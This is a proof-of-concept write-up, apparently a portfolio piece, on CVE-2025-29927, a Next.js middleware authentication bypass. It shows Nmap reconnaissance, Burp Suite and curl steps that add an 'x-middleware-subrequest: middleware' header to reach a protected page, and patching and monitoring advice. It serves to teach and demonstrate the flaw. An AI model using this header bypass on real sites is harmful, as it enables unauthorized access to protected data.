## Proof of Concept: Exploiting CVE-2025-29927 (Next.js Middleware Bypass Vulnerability)

### Overview

**CVE-2025-29927** is a critical security vulnerability in Next.js, a widely used open-source React framework for building full-stack web applications. Disclosed on March 21, 2025, this vulnerability allows attackers to bypass middleware-enforced authorization checks, potentially granting unauthorized access to protected resources. It has a CVSS score of **9.1**, reflecting its critical severity due to its ease of exploitation and significant impact. The flaw arises from improper handling of the `x-middleware-subrequest` HTTP header, which is meant to prevent infinite loops in middleware execution. By crafting a specific value in this header, attackers can skip middleware execution, bypassing security checks like authentication or session validation. This PoC demonstrates how to exploit this vulnerability to access a protected page without authentication, highlighting my skills in vulnerability exploitation, HTTP header manipulation, and penetration testing.

---

### Vulnerability Details

- **Category**: HTTP Header Vulnerability  
- **Affected Component**: Next.js Middleware  
- **Impact**: Bypasses authentication and authorization controls, allowing unauthorized access to protected resources.  
- **CVSS Score**: 9.1 (Critical)  
- **Disclosure Date**: March 21, 2025

---

### PoC: Exploiting CVE-2025-29927 to Access a Protected Page

#### Step 1: Initial Reconnaissance

**Objective**: Identify open ports and services on the target machine.  
**Methodology**:  
- Scanned the target using Nmap with the command:  
  ```bash
  nmap -T4 -sV IP
  ```  
- **Result**: Identified two open ports:  
  - Port 22: SSH  
  - Port 3000: HTTP service  

**Screenshot**:  
![Nmap Scan Results](https://github.com/user-attachments/assets/39b2cf45-2f31-4b8a-a165-f98856a1e163)

#### Step 2: Verify HTTP Service on Port 3000

**Objective**: Confirm the service running on port 3000.  
**Methodology**:  
- Used `curl` to send a request to the target:  
  ```bash
  curl http://IP
  ```  
- **Result**: Received an HTTP response, confirming that port 3000 is running an HTTP service.  

**Screenshot**:  
![Curl HTTP Response](https://github.com/user-attachments/assets/d3d22e83-cd22-4515-a5ac-d920427b0e96)

#### Step 3: Access the Web Application via Browser

**Objective**: Explore the web application to identify protected resources.  
**Methodology**:  
- Navigated to `http://IP:3000` using a browser.  
- Attempted to access a "Protected Page" (`/protected`), which required authentication.  
- Without authentication, the request was redirected to the homepage.  

**Screenshot**:  
![Homepage Access via Browser](https://github.com/user-attachments/assets/9cd55715-e9a6-499b-87a0-6cc5f678d34b)

#### Step 4: Exploit CVE-2025-29927 Using Burp Suite

**Objective**: Bypass middleware authentication by manipulating the `x-middleware-subrequest` header.  
**Methodology**:  
- Intercepted the request to the "Protected Page" (`http://IP:3000/protected`) using Burp Suite.  
- Modified the request by adding the header:  
  ```
  x-middleware-subrequest: middleware
  ```  
- Forwarded the modified request.  
- **Result**: Successfully accessed the "Protected Page" without authentication, confirming the middleware bypass vulnerability.  

**Screenshots**:  
- **Intercepted Request in Burp Suite**:  
  ![Intercepted Request](https://github.com/user-attachments/assets/841a52b7-70a1-4a35-9aa5-cf7afe6a364a)  
- **Modified Request with x-middleware-subrequest Header**:  
  ![Modified Request](https://github.com/user-attachments/assets/7bdd9387-80d2-44ab-960d-546f59f2881e)  
- **Access to Protected Page**:  
  ![Protected Page Accessed](https://github.com/user-attachments/assets/fbd3be11-ef21-4a6d-be86-be811f771e93)

#### Alternative Method: Exploit Using Curl (Without Burp Suite)

**Objective**: Replicate the exploit using a command-line tool to demonstrate versatility.  
**Methodology**:  
- First, accessed the "Protected Page" without the header:  
  ```bash
  curl http://IP/protected
  ```  
  - **Result**: Redirected to the homepage (`/` response).  
- Then, added the `x-middleware-subrequest` header to the request:  
  ```bash
  curl -H "x-middleware-subrequest: middleware" http://IP:3000/protected
  ```  
  - **Result**: Successfully accessed the "Protected Page" content, bypassing authentication.  

**Screenshots**:  
- **Curl Request Without Header (Redirect to Homepage)**:  
  ![Curl Without Header](https://github.com/user-attachments/assets/1f9ffd76-5280-4c45-8335-cb95f04c9a27)  
- **Curl Request With Header (Protected Page Accessed)**:  
  ![Curl With Header](https://github.com/user-attachments/assets/0aec4084-c29d-4307-9b1b-41999db96ace)

---

### Key Takeaways

- **Vulnerability Exploitation**: CVE-2025-29927 allows attackers to bypass Next.js middleware by injecting a crafted `x-middleware-subrequest` header, granting unauthorized access to protected resources.  
- **Ease of Exploitation**: The vulnerability can be exploited using simple tools like Burp Suite or Curl, requiring minimal technical skill, which underscores its critical severity (CVSS 9.1).  
- **Mitigation Strategies**: To prevent such attacks, organizations should:  
  - Patch Next.js to the latest version to fix CVE-2025-29927.  
  - Validate and sanitize HTTP headers to prevent middleware bypass.  
  - Implement additional security controls, such as Web Application Firewalls (WAFs), to block malicious header manipulation.  
  - Monitor for unusual traffic patterns that may indicate exploitation attempts.









